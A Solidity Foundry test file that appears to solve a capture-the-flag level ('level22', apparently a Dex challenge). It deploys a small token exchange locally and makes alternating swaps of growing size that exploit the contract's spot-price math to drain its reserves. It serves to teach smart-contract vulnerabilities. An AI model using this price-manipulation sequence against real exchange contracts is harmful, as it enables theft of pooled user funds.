// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "src/level22.sol";

contract POC is Test {
    Dex level22;
    SwappableToken tokenA;
    SwappableToken tokenB;
    address player;

    function setUp() public {
        player = makeAddr("player");

        // Defining contracts
        level22 = new Dex();
        tokenA = new SwappableToken(address(level22), "Token A", "TKNA", 110);
        tokenB = new SwappableToken(address(level22), "Token B", "TKNB", 110);

        level22.setTokens(address(tokenA), address(tokenB));

        tokenA.approve(address(level22), 100);
        tokenB.approve(address(level22), 100);

        level22.addLiquidity(address(tokenA), 100);
        level22.addLiquidity(address(tokenB), 100);

        tokenA.transfer(player, 10);
        tokenB.transfer(player, 10);
    }

    function test() public {
        startHoax(player, 10 ether);

        level22.approve(address(level22), 200);
        level22.swap(address(tokenA), address(tokenB), 10);
        level22.swap(address(tokenB), address(tokenA), 20);
        level22.swap(address(tokenA), address(tokenB), 24);
        level22.swap(address(tokenB), address(tokenA), 30);
        level22.swap(address(tokenA), address(tokenB), 41);
        level22.swap(address(tokenB), address(tokenA), 45);

        tokenA.balanceOf(address(level22));
        tokenB.balanceOf(address(level22));

        vm.stopPrank();
    }
}
